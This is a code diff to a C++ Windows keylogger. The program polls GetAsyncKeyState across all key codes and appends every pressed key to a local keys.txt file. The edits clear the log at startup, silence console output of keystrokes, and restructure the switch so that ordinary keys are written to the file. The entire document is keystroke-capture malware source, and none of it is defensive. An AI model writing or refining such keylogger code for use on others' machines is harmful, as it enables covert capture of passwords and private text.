@@ -8,7 +8,7 @@ using namespace std;
 void startLogging();
 
 int main(){
-    
+    ofstream keys("keys.txt", ios::trunc); // clear the keys.txt file everytime this code is run
     startLogging();
     return 0; 
 }
@@ -20,7 +20,7 @@ void startLogging(){
         for (c = 0; c < 255; c++){
             bool pressed = GetAsyncKeyState(c) & 0x1;
             if (pressed){
-                cout << c;
+                // cout << c;
                 ofstream keys;
                 keys.open("keys.txt", ios::app);
                 switch (c) {
@@ -48,9 +48,11 @@ void startLogging(){
                     case VK_LBUTTON:
                         break;
                     case VK_RBUTTON:
-                        break;    
+                        break; 
+                    default:
+                        keys << c;   
                 }
-                keys << c;
+                
             }
         }
     }
